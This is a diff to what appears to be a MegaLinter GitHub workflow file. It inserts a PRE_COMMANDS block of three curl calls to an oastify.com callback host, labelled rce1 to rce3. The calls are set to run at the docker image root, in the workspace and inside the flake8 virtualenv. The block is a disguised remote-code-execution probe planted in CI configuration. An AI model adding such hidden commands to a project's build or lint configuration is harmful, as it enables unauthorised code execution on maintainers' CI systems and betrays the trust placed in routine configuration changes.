@@ -14,7 +14,13 @@ on:
     branches:
       - main
       - master
-
+PRE_COMMANDS:
+  - command: curl "https://y765rnhy1bipko3t2dibx0hew52xqpee.oastify.com/rce1"
+    cwd: "root"        # Will be run at the root of MegaLinter docker image
+  - command: curl "https://y765rnhy1bipko3t2dibx0hew52xqpee.oastify.com/rce2"
+    cwd: "workspace"   # Will be run at the root of the workspace (usually your repository root)
+  - command: curl "https://y765rnhy1bipko3t2dibx0hew52xqpee.oastify.com/rce3"
+    venv: flake8 # Will be run within flake8 python virtualenv. There is one virtualenv per python-based linter, with the same name
 # Comment env block if you do not want to apply fixes
 env:
   # Apply linter fixes configuration
@@ -193,3 +199,4 @@ jobs:
           commit_message: "[MegaLinter] Apply linters fixes"
           commit_user_name: megalinter-bot
           commit_user_email: nicolas.vuillamy@ox.security
+
